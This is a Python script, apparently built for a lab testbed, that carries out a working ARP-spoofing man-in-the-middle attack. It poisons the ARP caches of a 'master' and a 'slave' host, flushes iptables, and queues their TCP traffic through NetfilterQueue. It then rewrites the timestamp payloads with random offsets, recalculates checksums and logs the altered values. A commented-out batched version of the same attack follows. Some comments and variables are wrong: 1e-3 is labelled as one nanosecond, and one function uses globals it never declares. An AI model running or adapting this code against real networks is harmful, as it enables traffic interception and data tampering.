from scapy.all import *
from netfilterqueue import NetfilterQueue
import numpy as np
from datetime import datetime
import random
import logging
import os
import socket
import subprocess
import time
import csv

import threading
import queue



logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def get_ip_address(hostname):
    try:
        ip_add = socket.gethostbyname(hostname)
        return ip_add
    except socket.gaierror:
        logging.error(f"Could not resolve hostname: {hostname}")
        return None

SENDER_NAME = os.environ.get('SENDER_NAME', 'master')
RECEIVER_NAME = os.environ.get('RECEIVER_NAME', 'slave')

SENDER_IP = get_ip_address(SENDER_NAME)
RECEIVER_IP = get_ip_address(RECEIVER_NAME)
ATTACKER_MAC = "02:42:ac:11:00:02"

print(f"SENDER_NAME: {SENDER_NAME}, SENDER_IP: {SENDER_IP}")
print(f"RECEIVER_NAME: {RECEIVER_NAME}, RECEIVER_IP: {RECEIVER_IP}")
if not SENDER_IP or not RECEIVER_IP or not ATTACKER_MAC:
    logging.error("Failed to resolve IP addresses or get MAC address. Exiting.")
    exit(1)
  
# Attack parameters
fixed_delay = 1e-3  # 1 nanosecond initial delay
jitter_std = 1e-11  # 10 picoseconds standard deviation for jitter
ramp_factor = 1.0001  # 0.01% increase in delay per timestamp

def arp_spoof(master_ip, slave_ip, attacker_mac):
    master_mac = getmacbyip(master_ip)
    slave_mac = getmacbyip(slave_ip)
    
    fake_master = ARP(op=2, pdst=master_ip, hwdst=master_mac, psrc=slave_ip, hwsrc=attacker_mac)
    fake_slave = ARP(op=2, pdst=slave_ip, hwdst=slave_mac, psrc=master_ip, hwsrc=attacker_mac)
    
    while True:
        send(fake_master, verbose=False)
        send(fake_slave, verbose=False)
        time.sleep(10)

DATA_DIR = '/data'
os.makedirs(DATA_DIR, exist_ok=True)

def save_modified_data(modified_data):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"modified_data_session_{timestamp}.csv"
    filepath = os.path.join(DATA_DIR, filename)
    
    if not modified_data:
        logging.warning("No modified data to save.")
    
    with open(filepath, 'w', newline='') as csvfile:
        csv_writer = csv.writer(csvfile)
        csv_writer.writerow(["Modified Data"])
        for data_point in modified_data:
            # Debug output for data points
            # print(f"Saving data point: {data_point}")
            csv_writer.writerow([data_point])
    logging.info(f"Modified data saved to {filename}")

def delay_attack(payload, fixed_delay, jitter_std, ramp_factor):

    # global modified_data_points, processed_data_points
    timestamps = payload.decode().strip().split('\n')
    print("time stamps:")
    print(timestamps)

    current_delay = 0
    modified_data = []
    
    for timestamp in timestamps:
        if timestamp:  
            
            original_time = float(timestamp)
            print("before attack:")
            print(original_time)

            # current_delay = fixed_delay * (ramp_factor ** i)
            jitter = np.random.normal(0, jitter_std)
            print(f"Jitter:{jitter}")

            attacked_time = original_time + jitter
            print("attacked time :")
            print(attacked_time)

            modified_data_points += 1
            processed_data_points += 1
            modified_data.append(attacked_time)
            # return f"{attacked_time:.9f}\n".encode()
            
    print("Modified data points:")
    print(modified_data)
    save_modified_data(modified_data)
    
    # Join the modified timestamps back into a single string
    return '\n'.join([f"{t:.9f}" for t in modified_data]).encode() + b'\n'

def packet_callback(pkt):
    try:
        print("pkt:")
        print(pkt)
        scapy_pkt = IP(pkt.get_payload())
        print("scapy_pkt:")
        print(scapy_pkt)
        
        if scapy_pkt.haslayer(IP) and scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
            src_ip = scapy_pkt[IP].src
            dst_ip = scapy_pkt[IP].dst
            
            if src_ip == SENDER_IP and dst_ip == RECEIVER_IP:
                tcp_layer = scapy_pkt[TCP]
                original_payload = scapy_pkt[Raw].load  
                print("Intercepted payload:")
                print(original_payload)
                # new_payload = original_payload +b'\n'+ f"{0.01:.9f}\n".encode()
                  # Decode and split the payload into timestamps
                timestamps = original_payload.decode().strip().split('\n')
                modified_datas = []
                
                for timestamp in timestamps:
                    if timestamp:
                        # if random.randint(1, 100) <= 50:
                        original_time = float(timestamp)
                        np.random.seed(123)
                        random_value = round(np.random.uniform(-0.01, 0.01), 9)
                        modified_time = original_time + random_value
                        modified_datas.append(f"{modified_time:.9f}")
                    # else:
                        #     modified_datas.append(timestamp)

                # Join modified data into a new payload
                new_payload = '\n'.join(modified_datas).encode() + b'\n'
                print("new payload:")
                print(new_payload)

                 # Adjust the TCP segment if the payload size changes
                tcp_layer.remove_payload()
                tcp_layer.add_payload(new_payload)
                new_pkt = scapy_pkt.copy()
                # new_pkt[Raw].load = new_payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    

                # Delete checksums to force recalculation
                del new_pkt[IP].chksum
                del new_pkt[TCP].chksum
                
                    # Recalculate packet
                new_raw_payload = raw(new_pkt)
                pkt.set_payload(new_raw_payload)

                print("updated pkt:")
                print(pkt)

                # Log new checksums
                new_ip_checksum = new_pkt[IP].chksum
                new_tcp_checksum = new_pkt[TCP].chksum
                logging.info(f"New IP checksum: {new_ip_checksum}")
                logging.info(f"New TCP checksum: {new_tcp_checksum}")
                
                logging.info(f"Modified packet from {src_ip} to {dst_ip}. Total modified data points: {modified_data_points}")
        
        pkt.accept()
    except Exception as e:
        logging.error(f"Error in packet_callback: {str(e)}")
        pkt.accept()  # Accept the original packet if there's an error

def mitm_attack():
    global modified_data_points, processed_data_points
    # arp_spoof(SENDER_IP, RECEIVER_IP, ATTACKER_MAC)
    try:
    #     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        # Start ARP spoofing in a separate thread
        import threading
        arp_thread = threading.Thread(target=arp_spoof, args=(SENDER_IP, RECEIVER_IP, ATTACKER_MAC), daemon=True)
        arp_thread.start()
    
        logging.info("ARP spoofing started. Waiting for 5 seconds before capturing packets...")
        
        time.sleep(2)  # Wait for ARP spoofing to take effect
        
        os.system("iptables -F")  # Flush existing rules
        
        os.system(f"iptables -A FORWARD -p tcp -s {SENDER_IP} -d {RECEIVER_IP} -j NFQUEUE --queue-num 0")
   
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, packet_callback)

        logging.info("Starting packet interception...")
        nfqueue.run()
        
    except KeyboardInterrupt:
        logging.info("Stopping packet interception...")
    except Exception as e:
        logging.error(f"MITM attack error: {e}")
    finally:
        nfqueue.unbind()
        os.system("iptables -F")
        logging.info(f"MITM attack stopped for this session. Total modified data points: {modified_data_points}")

if __name__ == "__main__":
    while True: 
        modified_data_points = 0
        processed_data_points = 0
        mitm_attack()
        

# QUEUE_NUM = 0
# MAX_QUEUE_SIZE = 1000
# BATCH_SIZE = 10
# PROCESSING_INTERVAL = 0.1  # seconds

# # Global variables
# packet_queue = queue.Queue(maxsize=MAX_QUEUE_SIZE)
# processed_packets = queue.Queue()

# def modify_packet(scapy_pkt):
#     if scapy_pkt.haslayer(IP) and scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
#         src_ip = scapy_pkt[IP].src
#         dst_ip = scapy_pkt[IP].dst
        
#         if src_ip == SENDER_IP and dst_ip == RECEIVER_IP:
#             tcp_layer = scapy_pkt[TCP]
#             original_payload = scapy_pkt[Raw].load
            
#             timestamps = original_payload.decode().strip().split('\n')
#             modified_datas = []
            
#             for timestamp in timestamps:
#                 if timestamp:
#                     original_time = float(timestamp)
#                     modified_time = original_time + np.random.normal(0, 1)
#                     modified_datas.append(f"{modified_time:.9f}")

#             new_payload = '\n'.join(modified_datas).encode() + b'\n'
            
#             tcp_layer.remove_payload()
#             tcp_layer.add_payload(new_payload)
            
#             del scapy_pkt[IP].chksum
#             del scapy_pkt[TCP].chksum
            
#             return raw(scapy_pkt)
    
#     return scapy_pkt.get_payload()

# def packet_callback(pkt):
#     try:
#         if packet_queue.qsize() < MAX_QUEUE_SIZE:
#             packet_queue.put(pkt)
#         else:
#             logging.warning("Queue full, accepting packet without modification")
#             pkt.accept()
#     except Exception as e:
#         logging.error(f"Error in packet_callback: {str(e)}")
#         pkt.accept()

# def process_packets():
#     while True:
#         batch = []
#         for _ in range(BATCH_SIZE):
#             try:
#                 pkt = packet_queue.get(timeout=PROCESSING_INTERVAL)
#                 batch.append(pkt)
#             except queue.Empty:
#                 break
        
#         if batch:
#             for pkt in batch:
#                 scapy_pkt = IP(pkt.get_payload())
#                 modified_payload = modify_packet(scapy_pkt)
#                 pkt.set_payload(modified_payload)
#                 processed_packets.put(pkt)

# def accept_packets():
#     while True:
#         try:
#             pkt = processed_packets.get(timeout=0.1)
#             pkt.accept()
#         except queue.Empty:
#             continue

# def mitm_attack():
#     try:

#         #  Start ARP spoofing in a separate thread
#         import threading
#         arp_thread = threading.Thread(target=arp_spoof, args=(SENDER_IP, RECEIVER_IP, ATTACKER_MAC), daemon=True)
#         arp_thread.start()
    
#         logging.info("ARP spoofing started. Waiting for 5 seconds before capturing packets...")
        
#         time.sleep(2)  # Wait for ARP spoofing to take effect

#         # Start packet processing thread
#         processing_thread = threading.Thread(target=process_packets, daemon=True)
#         processing_thread.start()

#         # Start packet accepting thread
#         accepting_thread = threading.Thread(target=accept_packets, daemon=True)
#         accepting_thread.start()

#         # Set up NFQUEUE
#         os.system("iptables -F")
#         os.system(f"iptables -A FORWARD -p tcp -s {SENDER_IP} -d {RECEIVER_IP} -j NFQUEUE --queue-num {QUEUE_NUM}")
        
#         nfqueue = NetfilterQueue()
#         nfqueue.bind(QUEUE_NUM, packet_callback)

#         logging.info("Starting packet interception...")
#         nfqueue.run()
        
#     except KeyboardInterrupt:
#         logging.info("Stopping packet interception...")
#     except Exception as e:
#         logging.error(f"MITM attack error: {e}")
#     finally:
#         nfqueue.unbind()
#         os.system("iptables -F")

# if __name__ == "__main__":
#     while True: 
#         # modified_data_points = 0
#         # processed_data_points = 0
#         mitm_attack()
        